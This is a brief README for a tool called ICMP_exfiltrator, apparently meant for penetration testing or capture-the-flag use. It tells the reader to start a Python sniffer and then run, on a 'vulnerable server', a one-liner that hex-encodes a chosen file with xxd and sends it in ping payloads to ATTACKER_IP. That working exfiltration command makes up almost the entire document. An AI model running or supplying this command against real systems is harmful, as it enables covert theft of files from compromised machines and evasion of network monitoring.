# ICMP_exfiltrator

## Usage

- Start the sniffer 

```
sudo python3 ICMP_exfiltrator.py tun0
```

- Execute in the vulnerable server

```
xxd -p -c 4 /file/to/read | while read line; do ping -c 1 -p $line ATTACKER_IP; done
```

- And you will be able to read the file in the sniffer window
